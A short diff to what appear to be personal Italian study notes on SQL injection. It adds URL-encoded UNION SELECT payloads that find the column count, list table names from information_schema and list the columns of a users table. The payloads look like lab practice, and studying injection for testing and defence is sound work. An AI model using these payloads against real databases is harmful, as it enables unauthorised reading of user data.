@@ -57,6 +57,10 @@ bisogna capire bene la versione del databse e seguire i comandi specifici per og
 ' UNION SELECT NULL,NULL,'a',NULL--
 ' UNION SELECT NULL,NULL,NULL,'a'--
 
+'+UNION+SELECT+'abc','def'--   -> find column number
+'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--   -> find table names
+'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--  -> find columns names of the table
+
 utilizzabile per capire il tipo di dato, sperando che inserendo un char su un int generi errore
 
 concatena con |cazzo| per ritornare due o più output sulla stessa colonna 
